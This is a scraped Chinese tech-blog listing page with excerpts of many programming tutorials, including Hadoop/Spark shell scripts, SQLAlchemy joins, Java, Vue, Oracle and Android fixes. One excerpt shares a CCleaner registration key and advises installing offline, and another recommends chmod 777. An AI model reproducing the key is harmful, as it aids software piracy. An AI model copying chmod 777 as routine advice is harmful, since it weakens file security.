例子：
#!bin/shecho "==============================================="echo "================启动 Hadoop==================="echo "==============================================="start-all.sh; echo "==============================================="echo "================启动 Spark===================="echo "==============================================="cd /usr/local/spark/spark-2.1.1-bin-hadoop2.7;./sbin/start-all.sh; echo代表在命令行打印消息。
3.执行方法
(1)在控制台输入命令执行：
sh test.sh
(2)先给脚本可执行权限，双击执行：
右键此文件，选择属性－&gt;权限，最下方会有一个“允许以程序执行文件”，将这一项勾选，就可以了。
或在命令行下附予权限：
chmod 777 test.sh
或： chmod +x test.sh
二、linux跨机器批处理执行命令 master 192.168.168.200
slave1 192.168.168.201
slave2 192.168.168.202
已经配置好三台机器的ssh免登陆。
在master 上写的脚本如何在其他机器上执行命令呢？
如果我连到另一台机器上只是执行一个命令可以这样写：
ssh slave1 cd /opt/
如果我连到另一台机器上执行多于一个命令可以这样写：
ssh slave1 "cd /opt/;exit;"
注意：当多于两个命令时，一定要把所有命令以分号的方式写在双引号里面。 转载于:https://my.oschina.net/u/3616609/blog/1475066
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c33969b10b5cdce07388f33c80b5384d/" rel="bookmark">
			sqlalchemy多表联合查询(inner outer join 左右连接)详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇内容为大家提供的是sqlalchemy多表联合查询(inner outer join 左右连接)详解，该教程主要介绍了sqlalchemy的多表联合查询。
#按用户名摸糊查询 trans_details.query.join(Uses).filter(Users.username.like('%xx%')) #select xxx from trans_details inner join trans_details on users.id=trans_details.user_id where users.username like '%xx%' #左外联接(left join) trans_details.query.outerjoin(Uses).filter(Users.username.like('%xx%')) #select xxx from trans_details left outer join trans_details on users.id=trans_details.user_id where users.username like '%xx%' #以上是已经设置好外键,它自动找到关联的字段.也可以自己指定: trans_details.query.join(Uses,trans_details.user_id==Users.id).filter(Users.username.like('%xx%')) #select xxx from trans_details inner join trans_details on users.id=trans_details.user_id where users.username like '%xx%' #另外一个更复杂的例子: q=db.session.query(Credit_bills_details.no,Credit_bills_details.amount,Cards.no).outerjoin(Card_trans_details, Credit_bills_details.no==Card_trans_details.trans_no).join(Cards,Card_trans_details.to_card_id==Cards.id)\ .filter(Credit_bills_details.credit_bill_id==3) #SELECT credit_bills_details.no AS credit_bills_details_no, credit_bills_details.amount AS credit_bills_details_amount, cards.no AS cards_no # FROM credit_bills_details LEFT OUTER JOIN card_trans_details ON credit_bills_details.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c33969b10b5cdce07388f33c80b5384d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64e015273b69affaf5a874ffdefea2b7/" rel="bookmark">
			Java 子类调用父类构造函数----super()详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		class FatherClass{ public FatherClass(){ System.out.println("父类 无参 构造函数"); } public FatherClass(int i){ System.out.println("父类 一个参数构造函数super = "+i); } public FatherClass(int i,String j){ System.out.println("父类 一个参数构造函数superi = "+i+",superj = "+j); } } class SonClass extends FatherClass{ public SonClass(){ //	super(22);//line 1 System.out.println("子类 无参 构造函数"); } public SonClass(int a){ super(33,"Hello");//line 2 System.out.println("子类一个参数构造函数sub = "+a); } public void fun(int a){//子类中定义一个实例函数 //super(33,"Hello");//构造函数调用必须声明在构造函数中,这行代码不注释的话会报错 System.out.println("子类一个参数构造函数sub = "+a); } } public class ConstructorExtend {//测试子类继承父类的构造函数 public static void main(String args[]){ //	FatherClass fa = new FatherClass(); //	FatherClass fa1 = new FatherClass(100); //	SonClass son = new SonClass(); SonClass son1 = new SonClass(200); son1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64e015273b69affaf5a874ffdefea2b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b25a0a53c2c575516cdc91df41ea61d2/" rel="bookmark">
			win 10 安装robomongo（studio 3T）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相关资源下载到官网：https://robomongo.org/ 1.如图选择download studio 3T，之所以选择这个而不是robo 3T单纯是因为功能和后期的支持。studio 3T基础功能是免费的，部分功能是收费的，但是一般情况下基础功能就能应付学习和一般工作了。
2.傻瓜式安装，中间可以选择下安装目录。需要注意安装完后启动文件在根目录而不是在bin目录。
3.用studio 3T 测试连接mongodb,需要启动一个mongodb.具体安装见：win 10 安装mongodb3.4，具体步骤如下图所标：
1. 启动mongodb
2. 点击connect 会弹出连接窗口，显示已有的连接和对连接的一些操作功能
3. 创建新连接
4. 在新建窗口填写连接名，随意填。服务器填localhost。（mongodb默认没有权限控制，任意账号都具有管理员权限）。
5. 结果显示
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bc2c5ef6304cb46e13c1085c56e7227/" rel="bookmark">
			在最短路径分析中，为何分析的结果“不是”最短路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在ArcGIS网络分析中，最短路径分析是很常见的应用，但用户偶尔会发现，软件所分析出来的路径，并非“如此”，然而很明显的绕了远路，如下图所示：
那么造成这个情况的原因到底是什么呢？真的是软件有bug，还是数据出了问题。事实并非如此，首先我们来介绍一个结点的概念。
网络边的两个端点称为网络结点，网络中边与边之间通过结点相连。结点根据它在网络中的角色或与它相连的边的属性而具有某些特定的属性，如在道路的交叉路口处具有穿过路口的时间属性等，如下图所示。
那么这段话到底是什么意思，跟本文所说的问题又有什么关系呢？用通俗的话来说，就是如下图所示。用户想要从①走向②，我们通过主观就可以判断①②之间的直线才是最短路径，可偏偏软件提供的最短路径是①③④⑤②（默认没有转弯要素、单行线等因素）。是因为①②两点间的线段和横穿此线段的路线的交叉点并没有节点，软件会自动判定为此交叉点不是十字路口，是高架桥等不通的路线。
解决此类问题，若真是道路情况就是如此，则不需要改变，软件分析所得出的路线是正确的。如若是数据采集或处理过程中出现了问题，只需将所有的线打断即可（在【编辑器】的【高级编辑】模块有【打断相交线】的功能）。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9131865bc7144d0e2fad12870c10400a/" rel="bookmark">
			HTML CSS 实现鼠标悬停时图片拉近效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 为了让网页的使用体验更好，我们会让网页的某些元素对鼠标的动作做出响应。例如鼠标滑过、单击按钮的时候按钮变色、变形。之前在很多网页上看到了鼠标滑过一个图片链接时图片放大、拉近的效果，今天尝试实现一下。
1. 使用background实现 思路：设置以图片作为div元素的背景，鼠标滑过div的时候通过background属性放大图片。
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;background实现图片拉近效果&lt;/title&gt; &lt;style&gt; #box { background: url(../images/img022.png); width: 720px; height: 720px; margin: 0 auto; border: 1px solid #aaa; background-color: #444; } #box:hover { background-size: 100.5% 100.5%; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id='box'&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 2. 使用img元素的width height属性实现 思路：当鼠标滑过图片时，修改img元素的width和height属性放大图片
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;img图片拉近效果&lt;/title&gt; &lt;style&gt; #box{ width:60%; min-width:1000px; min-height:800px; margin:0 auto; border:1px solid #aaa; background-color:#444; text-align:center; } img:hover{ width:723px; height:723px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id='box'&gt; &lt;img src="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9131865bc7144d0e2fad12870c10400a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/612e15bbf50b81af7673295fbb9cd6d8/" rel="bookmark">
			vue-cli 构建的项目中如何使用 Less
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 vue-cli 构建的项目默认是不支持 less 的，需要自己添加。
首选，安装 less 和 less-loader ，在项目目录下运行如下命令
npm install less less-loader --save-dev 当然，比起 npm，我个人更喜欢用 yarn
yarn add less less-loader --dev 安装成功后，打开 build/webpack.base.conf.js ，在 module.exports = 的对象的 module.rules 后面添加一段：
module.exports = { // 此处省略无数行，已有的的其他的内容 module: { rules: [ // 此处省略无数行，已有的的其他的规则 { test: /\.less$/, loader: "style-loader!css-loader!less-loader", } ] } } 最后，在代码中的 style 标签中 加上 lang="less" 属性即可~
&lt;style scoped lang="less"&gt; &lt;/style&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f7e0fec7a6eb9d555f063b6838d73f4/" rel="bookmark">
			Angular 和 Vue 等前端框架中的数据绑定模拟
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对 Angular 和 Vue 等前端框架中的数据单向绑定和双向绑定很感兴趣，于是自己试着模拟了一个。采用 AngularJS 的语法，在标签中添加 yjb-bind表示单向绑定，yjb-model表示双向绑定。
数据监听 数据绑定首要要实现的就是数据监听，而数据监听的方法有很多，这里我采用了 setter 方法。
废话少说，上代码！
HTML部分： &lt;input type="text" yjb-model="message" placeholder="双向绑定message" id="inp"&gt; &lt;input type="text" yjb-bind="message" placeholder="单向绑定message"&gt; &lt;div yjb-bind="message"&gt;&lt;/div&gt; &lt;hr&gt; &lt;input type="text" yjb-model="text" placeholder="双向绑定text"&gt; &lt;input type="text" yjb-bind="text" placeholder="单向绑定text"&gt; &lt;div yjb-bind="text"&gt;&lt;/div&gt; JS部分 var scope = { message: "哈哈哈", text: "嘟嘟嘟" }; var keys = Object.keys(scope); // ["message", "text"] // 监听数据变化 keys.forEach(function (key) { // 定义一组不可枚举的属性 Object.defineProperty(scope, "__" + key, { value: scope[key], enumerable: false, writable: true }); // 监听数据修改 Object.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f7e0fec7a6eb9d555f063b6838d73f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/884edbf0cdf9be1d4c9b55b343c75829/" rel="bookmark">
			CCleaner注册码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意：先断网再安装！
注册码： C2YW-QTRT-ZVCG-PQDK-CZPC
by： https://www.youtube.com/watch?v=Gmk7UEceU6I
转载于:https://www.cnblogs.com/turtlegood/p/7183890.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02e96b0de6d7734874a883dcd30635ec/" rel="bookmark">
			php7与php 5.5 运行效率比较（实测篇）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		来源:
看了网站的php7安装文章一步一步努力终于把php7安装好了。
php7安装教程地址：
http://www.hcoder.net/books/read_10101.html
传说php7 运行效率极高，是真的吗？我来亲自试试，代码如下：
&lt;?php $stratTime = microtime(true); $startMemory = memory_get_usage(); $a = 1; for($i = 1; $i &lt;= 100000; $i++){ $a++; } echo $a; $endTime = microtime(true); $runtime = ($endTime - $stratTime) * 1000; //将时间转换为毫秒 $endMemory = memory_get_usage(); $usedMemory = ($endMemory - $startMemory) / 1024; echo "运行时间: {$runtime} 毫秒&lt;br /&gt;"; echo "耗费内存: {$usedMemory} K"; 以上代码是记录php运行100000次循环需要的时间和消耗的内存。 php7运行情况
100001运行时间: 3 - 7 毫秒 耗费内存: 0.109375 K php5.5运行情况
100001运行时间: 18 - 30 毫秒 耗费内存: 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02e96b0de6d7734874a883dcd30635ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa30b90f16cfda5550d5bdcf785df2cd/" rel="bookmark">
			修改oracle数据库 db_name,instace_name,sid_name
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念：db_name 被记录在数据文件，日志文件和控制文件中,可以不同于instance_name.
sid_name 1.主要是区别连接的数据库 2. 在操作系统层面上进行区分，当Oracle实例启动时，操作系统上fork的进程必须通过这个SID将实例与其他实例区分开来，后台进程通过该sid表示数据库 eg: ps-ef|grep smon
3.instance_name是数据库中的一个重要参数，一个主机中可以有相同instance_name的多个数据库。 Oracle的实例（instance）是由一块共享内存区域（SGA）和一组后台进程（background processes）共同组成；而后台进程正是数据库和操作系统进行交互的通道，这些进程的名称就是通过ORACLE_SID决定的
数据库名称db_name &gt;实例名称 instance_name &gt; oracle_sid
修改实例名称
原来的实例名称
SQL&gt; select dbid,name from v$database;
DBID NAME
---------- ---------
1475786014 ORCL
SQL&gt; select instance from v$thread ; INSTANCE
--------------------------------------------------------------------------------
orcl
修改过程：
SQL&gt; shu immediate;
Database closed.
Database dismounted.
ORACLE instance shut down.
[root@node ~]# vi /etc/oratab test:/u01/app/oracle/product/11.2.0/db_1:N [oracle@node ~]$ vi .bash_profile
export ORACLE_SID=test
[oracle@node ~]$ source .bash_profile [oracle@node ~]$ env|grep ORA
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa30b90f16cfda5550d5bdcf785df2cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a71a733421c0cbc7b83f6e02abc7967/" rel="bookmark">
			深度学习参数技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1：优化器
机器学习训练的目的在于更新参数，优化目标函数，常见优化器有SGD，Adagrad，Adadelta，Adam，Adamax，Nadam。
其中SGD和Adam优化器是最为常用的两种优化器，SGD根据每个batch的数据计算一次局部的估计，最小化代价函数。学习速率决定了每次步进的大小，因此我们需要选择一个合适的学习速率进行调优。学习速率太大会导致不收敛，速率太小收敛速度慢。
因此SGD通常训练时间更长，但是在好的初始化和学习率调度方案的情况下，结果更可靠。Adam优化器结合了Adagrad善于处理稀疏梯度和RMSprop善于处理非平稳目标的优点，能够自动调整学习速率，收敛速度更快，在复杂网络中表现更优。
2：学习速率
学习速率的设置第一次可以设置大一点的学习率加快收敛，后续慢慢调整；也可以采用动态变化学习速率的方式（比如，每一轮乘以一个衰减系数或者根据损失的变化动态调整学习速率）。 3：dropout
数据第一次跑模型的时候可以不加dropout，后期调优的时候dropout用于防止过拟合有比较明显的效果，特别是数据量相对较小的时候。
4：变量初始化。 常见的变量初始化有零值初始化、随机初始化、均匀分布初始值、正态分布初始值和正交分布初始值。一般采用正态分布或均匀分布的初始化值，有的论文说正交分布的初始值能带来更好的效果。实验的时候可以才正态分布和正交分布初始值做一个尝试。
5：训练轮数
模型收敛即可停止迭代，一般可采用验证集作为停止迭代的条件。如果连续几轮模型损失都没有相应减少，则停止迭代。
6：正则化
为了防止过拟合，可通过加入l1、l2正则化。从公式可以看出，加入l1正则化的目的是为了加强权值的稀疏性，让更多值接近于零。而l2正则化则是为了减小每次权重的调整幅度，避免模型训练过程中出现较大抖动。
7：预训练
对需要训练的语料进行预训练可以加快训练速度，并且对于模型最终的效果会有少量的提升，常用的预训练工具有word2vec和glove。
8：激活函数
常用的激活函数为sigmoid、tanh、relu、leaky relu、elu。采用sigmoid激活函数计算量较大，而且sigmoid饱和区变换缓慢，求导趋近于0，导致梯度消失。sigmoid函数的输出值恒大于0，这会导致模型训练的收敛速度变慢。
tanh它解决了zero-centered的输出问题，然而，gradient vanishing的问题和幂运算的问题仍然存在。relu从公式上可以看出，解决了gradient vanishing问题并且计算简单更容易优化，但是某些神经元可能永远不会被激活，导致相应的参数永远不能被更新（Dead ReLU Problem）；leaky relu有relu的所有优点，外加不会有Dead ReLU问题，但是在实际操作当中，并没有完全证明leaky relu总是好于relu。
elu也是为解决relu存在的问题而提出，elu有relu的基本所有优点，但计算量稍大，并且没有完全证明elu总是好于relu。
9：特征学习函数
常用的特征学习函数有cnn、rnn、lstm、gru。cnn注重词位置上的特征，而具有时序关系的词采用rnn、lstm、gru抽取特征会更有效。gru是简化版的lstm，具有更少的参数，训练速度更快。但是对于足够的训练数据，为了追求更好的性能可以采用lstm模型。
10：特征抽取
max-pooling、avg-pooling是深度学习中最常用的特征抽取方式。max-pooling是抽取最大的信息向量，然而当存在多个有用的信息向量时，这样的操作会丢失大量有用的信息。avg-pooling是对所有信息向量求平均，当仅仅部分向量相关而大部分向量无关时，会导致有用信息向量被噪声淹没。
针对这样的情况，在有多个有用向量的情形下尽量在最终的代表向量中保留这些有用的向量信息，又想在只有一个显著相关向量的情形下直接提取该向量做代表向量，避免其被噪声淹没。那么解决方案只有：加权平均，即Attention。
11：每轮训练数据乱序 每轮数据迭代保持不同的顺序，避免模型每轮都对相同的数据进行计算。
12：batch_size选择 对于小数据量的模型，可以全量训练，这样能更准确的朝着极值所在的方向更新。但是对于大数据，全量训练将会导致内存溢出，因此需要选择一个较小的batch_size。如果这时选择batch_size为1，则此时为在线学习，每次修正方向为各自样本的梯度方向修正，难以达到收敛。batch_size增大，处理相同数据量的时间减少，但是达到相同精度的轮数增多。
实际中可以逐步增大batch_size，随着batch_size增大，模型达到收敛，并且训练时间最为合适
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d81e71b205bfac224deb26f4b031aeb5/" rel="bookmark">
			tensorflow 变量生成 变量管理 tf.Variable、tf.get_variable、tf.variable_scope
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		____tz_zs学习笔记
tf.Variable 官网api：https://www.tensorflow.org/api_docs/python/tf/Variable
def __init__(self, initial_value=None, trainable=True, collections=None, validate_shape=True, caching_device=None, name=None, variable_def=None, dtype=None, expected_shape=None, import_scope=None): initial_value：初始化的值，可以是随机数、常数或者是通过其他变量的初始值得到的。
trainable：标记是否加入GraphKeys.TRAINABLE_VARIABLES集合
validate_shape：如果为false则可以更改shape
dtype：变量的类型，不可改变
变量被使用前，需要通过会话（session）运行其初始化方法完成初始化赋值
sess.run(tf.global_variables_initializer). #!/usr/bin/python2.7 # -*- coding:utf-8 -*- """ @author: tz_zs """ import tensorflow as tf variable_b = tf.Variable(initial_value=2.2, name="b") # initial_value 必须指定 ， &lt;tf.Variable 'b:0' shape=() dtype=int32_ref&gt; variable_d = tf.Variable(initial_value=tf.constant(4.4, shape=[3, 4]), name="d") # &lt;tf.Variable 'd:0' shape=(3, 4) dtype=float32_ref&gt; get_variable_a = tf.get_variable("a", (2, 5)) # &lt;tf.Variable 'a:0' shape=(2, 5) dtype=float32_ref&gt; with tf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d81e71b205bfac224deb26f4b031aeb5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be3a76ff772a4e30252878e333cf95dd/" rel="bookmark">
			Could not set property &#39;id&#39; of
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2019独角兽企业重金招聘Python工程师标准&gt;&gt;&gt; 问题： org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.executor.ExecutorException: Error selecting key or setting result to parameter object. Cause: org.apache.ibatis.reflection.ReflectionException: Could not set property 'id' of 解决方式： 对于org.apache.ibatis.executor.ExecutorException: There was no TypeHandler found for parameter...这个异常，是由于javaType和jdbcType的类型不匹配造成的。 解决方法： &lt;selectKey keyProperty="id" resultType="int" order="AFTER"&gt; 该为 &lt;selectKey keyProperty="id" resultType="Long" order="AFTER"&gt;
转载于:https://my.oschina.net/u/135283/blog/1358502
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53714c566ae4ce3057b49ef973bd0f34/" rel="bookmark">
			【Spring】 - lookup-method和replaced-method使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 lookup-method和replaced-method是在xml配置bean的时候的可选配置，其中lookup-method可以声明方法返回某个特定的bean，replaced-method可以改变某个方法甚至是改变方法的逻辑。 使用 （略过环境配置） 定义一个User接口，和接口的两个实现Teacher和Student User接口： public interface User { public void showMe(); } Teacher类： public class Teacher implements User { @Override public void showMe() { System.out.println("I am a Teacher"); } } Student类： public class Student implements User { @Override public void showMe() { System.out.println("I am a Student"); } } 测试用的Bean： public abstract class MyTestBean { //用于测试lookup-method public abstract User getUserBean(); //用于测试replace-method public void changedMethod() { System.out.println("Origin method in MyTestBean run"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53714c566ae4ce3057b49ef973bd0f34/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67272799aa839d2fa2e33c9b7c3c7e55/" rel="bookmark">
			android 拍照使用fileprovider遇到的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		废话少说，直接进入正题。 最大的坑是：
Process: com.android.camera2, PID: 20419 java.lang.SecurityException: Permission Denial: opening provider android.support.v4.content.FileProvider from ProcessRecord{4238a238 20419:com.android.camera2/u0a30} (pid=20419, uid=10030) that is not exported from uid 10143 其实字面意思上已经很好理解了，缺少权限，注意：5.0以上的手机是不会报这个错的 然后我就在网上搜，应该会有这方面的资料吧，搜了好长时间，国外的网站都翻了，除了exported和grantUriPermissions在manifest上设置外，竟然没有别的资料。 第二天，我觉得可能是我搜得不对，终于我搜到了一个靠谱的
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); 我想，这回肯定没问题了，但是结果总是出乎你的意料之外，竟然还是报错~~~~ 这可咋整，接着搜，点开一篇文章，没报什么希望，是介绍7.0的拍照调用fileprovider的，嗯？有不一样的设置
List&lt;ResolveInfo&gt; resInfoList= getPackageManager().queryIntentActivities(takePictureIntent, PackageManager.MATCH_DEFAULT_ONLY); for (ResolveInfo resolveInfo : resInfoList) { String packageName = resolveInfo.activityInfo.packageName; grantUriPermission(packageName, photoURI, Intent.FLAG_GRANT_WRITE_URI_PERMISSION); } 试试吧，一试，成了，太激动了，这是一款4.4.4的手机，没毛病~~~ 还有一款4.2.2的手机，一试，这个还报错，想了想，这个list循环只加了write权限，估计是缺少read权限，一加，果然好使！ 就此，这个深坑解决啦，希望别的网友也能看到这篇帖子 最后链接上给我思路的博客： http://www.jianshu.com/p/a1eb3ad79ef6 感谢！ 最后附上拍照源码：
private void take() { // 激活系统的照相机进行拍照 String filePath = AppConfig.CIVIL_WORKER_PATH + AppConfig.CHECK_PHOTO; File outputFile = new File(filePath); if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67272799aa839d2fa2e33c9b7c3c7e55/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcc9240ea7bcb3ae70aad21f0b2aa508/" rel="bookmark">
			iOS8.0 UILabel切圆角之后有时边缘会有一条黑线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如图所示
原因:frame的宽高没有取整 解决方法:在取frame得时候,加上CGRectIntegral,使得宽、高得到一个整数 原始给坐标: CGRectMake(Width - 10 * ScaleWidth - width, _timeLable.y, width, 16 * ScaleHeight)
修改后坐标: CGRectIntegral(CGRectMake(Width - 10 * ScaleWidth - width, _timeLable.y, width, 16 * ScaleHeight))
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9307840ba3c971bacf0ecbe534ec8be9/" rel="bookmark">
			【剑指Offer学习】【所有面试题汇总】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		剑指Offer学习 剑指Offer这本书已经学习完了，从中也学习到了不少的东西，现在做一个总的目录，供自已和大家一起参考，学如逆水行舟，不进则退。只有不断地学习才能跟上时候，跟得上技术的潮流！
所有代码下载【https://github.com/Wang-Jun-Chao/coding-interviews】 目录 第01-10题 【剑指Offer学习】【面试题02：实现Singleton 模式——七种实现方式】 【剑指Offer学习】【面试题03：二维数组中的查找】 【剑指Offer学习】【面试题04：替换空格】 【剑指Offer学习】【面试题05：从尾到头打印链表】 【剑指Offer学习】【面试题06：重建二叉树】 【剑指Offer学习】【面试题07：用两个栈实现队列】 【剑指Offer学习】【面试题08：旋转数组的最小数字】 【剑指Offer学习】【面试题09：斐波那契数列】 【剑指Offer学习】【面试题10：二进制中1 的个数】 第11-20题 【剑指Offer学习】【面试题11：数值的整数次方】 【剑指Offer学习】【面试题12：打印1 到最大的n 位数】 【剑指Offer学习】【面试题13：在O（1）时间删除链表结点】 【剑指Offer学习】【面试题14：调整数组顺序使奇数位于偶数前面】 【剑指Offer学习】【面试题15：链表中倒数第k个结点】 【剑指Offer学习】【面试题16：反转链表】 【剑指Offer学习】【面试题17：合并两个排序的链表】 【剑指Offer学习】【面试题18：树的子结构】 【剑指Offer学习】【面试题19：二叉树的镜像】 【剑指Offer学习】【面试题20：顺时针打印矩阵】 第21-30题 【剑指Offer学习】【面试题21：包含min函数的钱】 【剑指Offer学习】【面试题22：栈的压入、弹出序列】 【剑指Offer学习】【面试题23：从上往下打印二叉树】 【剑指Offer学习】【面试题24：二叉搜索树的后序遍历序列】 【剑指Offer学习】【面试题25：二叉树中和为某一值的路径】 【剑指Offer学习】【面试题26：复杂链表的复制】 【剑指Offer学习】【面试题27：二叉搜索树与双向链表】 【剑指Offer学习】【面试题28：字符串的排列】 【剑指Offer学习】【面试题29：数组中出现次数超过一半的数字】 【剑指Offer学习】【面试题30：最小的k个数】 第31-40题 【剑指Offer学习】【面试题31：连续子数组的最大和】 【剑指Offer学习】【面试题32：求从1到n的整数中1出现的次数】 【剑指Offer学习】【面试题33：把数组排成最小的数】 【剑指Offer学习】【面试题34：丑数】 【剑指Offer学习】【面试题35：第一个只出现一次的字符】 【剑指Offer学习】【面试题36：数组中的逆序对】 【剑指Offer学习】【面试题37：两个链表的第一个公共结点】 【剑指Offer学习】【面试题38：数字在排序数组中出现的次数】 【剑指Offer学习】【面试题39：二叉树的深度】 【剑指Offer学习】【面试题40：数组中只出现一次的数字】 第41-50题 【剑指Offer学习】【面试题41：和为s 的两个数字vs 和为s 的连续正数序列】 【剑指Offer学习】【面试题42：翻转单词顺序vs左旋转字符串】 【剑指Offer学习】【面试题43 : n 个锻子的点数】 【剑指Offer学习】【面试题44：扑克牌的顺子】 【剑指Offer学习】【面试题45：圆圈中最后剩下的数字(约瑟夫环问题)】 【剑指Offer学习】【面试题47：不用加减乘除做加法】 【剑指Offer学习】【面试题49：把字符串转换成整数】 【剑指Offer学习】【面试题50：树中两个结点的最低公共祖先】 第51-60题 【剑指Offer学习】【面试题51：数组中重复的数字】 【剑指Offer学习】【面试题52：构建乘积数组】 【剑指Offer学习】【面试题53：正则表达式匹配】 【剑指Offer学习】【面试题54：表示数值的字符串】 【剑指Offer学习】【面试题55：字符流中第一个不重复的字符】 【剑指Offer学习】【面试题56：链表中环的入口结点】 【剑指Offer学习】【面试题57：删除链表中重复的结点】 【剑指Offer学习】【面试题58：二叉树的下一个结点】 【剑指Offer学习】【面试题59：对称的二叉树】 【剑指Offer学习】【面试题60：把二叉树打印出多行】 第61-67题 【剑指Offer学习】【面试题61：按之字形顺序打印二叉树】 【剑指Offer学习】【面试题62：序列化二叉树】 【剑指Offer学习】【面试题63：二叉搜索树的第k个结点】 【剑指Offer学习】【面试题64：数据流中的中位数】 【剑指Offer学习】【面试题65：滑动窗口的最大值】 【剑指Offer学习】【面试题66：矩阵中的路径】 【剑指Offer学习】【面试题67：机器人的运动范围】 特别声明 欢迎转载，转载请注明出处【http://blog.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9307840ba3c971bacf0ecbe534ec8be9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a60cd69f5cdde6979c96bf0d03d09fb/" rel="bookmark">
			Rss Feed是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Feed是什么： 信源，理解成信息的源泉，英文是feed。信息发布网站将网站全部或者部分信息整合到一个 RSS 文件中，这个文件就被称之为 feed 。信源中包含的数据都是标准的 XML 格式，不但能直接被其他站点调用，也能在其他的终端和服务中使用.
